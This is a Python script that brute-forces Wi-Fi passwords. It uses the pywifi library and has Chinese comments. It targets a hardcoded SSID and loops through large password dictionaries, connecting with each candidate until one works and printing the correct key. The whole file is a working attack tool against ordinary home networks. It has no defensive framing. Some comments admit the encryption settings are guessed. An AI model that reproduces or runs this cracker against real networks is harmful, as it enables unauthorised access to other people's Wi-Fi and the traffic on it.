# -*- coding: utf-8 -*-
#
# @Time    : 2021-08-02 12:23:13
# @Author  : Yunlong Shi
# @Email   : syljoy@163.com
# @FileName: Crack_Wifi_tqdm.py
# @Software: PyCharm
# @Github    ：https://github.com/syljoy

import time
import pywifi
from pywifi import const  # 引用一些定义
from asyncio.tasks import sleep  # 执行异步操作时需要
import warnings
from tqdm import tqdm
warnings.filterwarnings("ignore")


class Crack_Wifi:
    def __init__(self, ssid, password_path):
        super(Crack_Wifi, self).__init__()
        self.ssid = ssid
        self.file = open(password_path, "r", errors="ignore")
        with open(password_path, "r", errors="ignore") as f:
            self.passwords_count = len(f.readlines())

        # 创建 PyWiFi 对象
        wifi = pywifi.PyWiFi()
        # 获取第一个无限网卡
        self.iface = wifi.interfaces()[0]
        # 获取加密方式
        # TODO：这里获取不到 cipher
        self.akm, self.cipher, self.auth = self.get_wireless(ssid)
        if not self.ssid_is_exist():
            print(self.ssid, 'is not exist!')
            return
        # 测试链接断开所有链接
        self.iface.disconnect()
        # 因为连接需要时间，所以每次连接间需要间隔，休眠1秒
        time.sleep(1)
        # 测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def get_wireless(self, ssid):
        self.iface.scan()
        time.sleep(1)
        wireless = self.iface.scan_results()
        for data in wireless:
            if data.ssid == ssid:
                # print('cipher =', data.cipher)
                return data.akm[0], data.cipher, data.auth[0]
        return None

    def ssid_is_exist(self):
        if self.akm is None:
            return False
        else:
            return True

    def crack_password(self):
        if not self.ssid_is_exist():
            return
        print("Password cracking:", self.ssid, 'and the codebook has', self.passwords_count, 'passwords')
        with tqdm(total=self.passwords_count,
                  desc="Password cracking {0}".format(self.ssid),
                  ascii=True, ncols=150) as pbar:
            while True:
                pbar.update(1)
                try:
                    password = self.file.readline().strip()
                    if not password:
                        break
                    if len(password) < 8 or len(password) > 64:
                        continue
                    pbar.set_postfix({'password': '{0}'.format(password)})
                    bool1 = self.test_connect(password)
                    if bool1:
                        print("Password", '"'+password+'"', 'is correct')
                        break
                    else:
                        pass
                        # print("Password", '"'+myStr+'"', 'is wrong')
                    sleep(3)
                except:
                    continue

    def test_connect(self, findStr):
        # 创建 wifi 配置文件
        profile = pywifi.Profile()
        # wifi名称
        profile.ssid = self.ssid
        # 网卡的开放
        profile.auth = self.auth
        # profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，


        # 设置 wifi 认证加密算法
        profile.akm.append(self.akm)
        # 设置加密单元
        # profile.cipher = self.cipher
        # TODO: 这里加密类型。。不知道是个啥
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        # 设置密码
        # print(findStr)
        profile.key = findStr
        # 将此前的配置WiFi文件删除
        self.iface.remove_all_network_profiles()
        # 设置新的配置文件
        tmp_profile = self.iface.add_network_profile(profile)
        # 网卡根据新的配置文件进行 WiFi 连接
        self.iface.connect(tmp_profile)
        time.sleep(5)
        # 判断是否连接上
        if self.iface.status() == const.IFACE_CONNECTED:
            isOK = True
        else:
            isOK = False
        # 将连接断开
        self.iface.disconnect()
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

    def __del__(self):
        self.file.close()


if __name__ == '__main__':
    # path = "password_dict/0. password.txt"
    # path = "password_dict/1.online_brute"
    path = "password_dict/2.10_million_password_list_top_100000.txt"
    # path = "password_dict/3.10_million_password_list_top_1000000.txt"
    # path = "password_dict/4.SkullSecurityComp"
    wifi_name = "TP-LINK_3B15" # ChinaNet-Ugic


    crack_wifi = Crack_Wifi(wifi_name, path)
    crack_wifi.crack_password()

